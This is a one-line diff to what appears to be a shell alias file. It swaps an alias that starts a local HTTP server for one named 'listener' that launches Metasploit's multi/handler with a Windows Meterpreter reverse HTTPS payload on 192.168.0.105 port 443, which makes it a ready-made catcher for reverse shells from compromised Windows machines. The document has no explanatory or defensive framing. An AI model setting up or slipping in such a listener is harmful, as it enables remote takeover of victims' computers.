@@ -1,1 +1,1 @@
-alias servidor='bash ~/start_http_server.sh'
+alias listener='msfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_https; set LHOST 192.168.0.105; set LPORT 443; exploit\"'
